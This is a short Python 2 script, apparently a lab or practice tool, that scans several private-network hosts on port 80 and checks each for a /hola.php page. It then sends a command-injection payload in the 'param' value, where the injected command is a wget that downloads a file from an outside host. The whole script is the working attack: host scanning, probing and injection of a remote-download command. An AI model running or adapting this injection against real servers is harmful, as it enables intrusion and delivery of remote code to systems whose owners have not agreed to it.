#!/usr/bin/python3
# -*- coding: utf-8 -*-

import socket
import requests


hosts = ["192.168.17.128", "192.168.2.1", "192.168.2.2", "192.168.2.10"]
ports = [80] #[22, 23, 80, 443, 445, 3389]

for host in hosts:
    for port in ports:
        try:
            print "[+] Connecting to " + host + ":" + str(port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            result = s.connect_ex((host, port))
            if result == 0:
                print "  [*] Port " + str(port) + " open!"
		req = requests.get("http://" + host + ":" + str(port) + "/hola.php" )
		status = req.status_code
		if(status == 200):
			print "[+] Fetching malicious files and injecting payload.."
			payload = "wget http://cdn.bulbagarden.net/upload/thumb/2/23/Pokk%C3%A9n_Pikachu.png/220px-Pokk%C3%A9n_Pikachu.png"
			req = requests.get("http://" + host + ":" + str(port) + "/hola.php?param=" + payload )
		
            s.close()
        except:
            pass

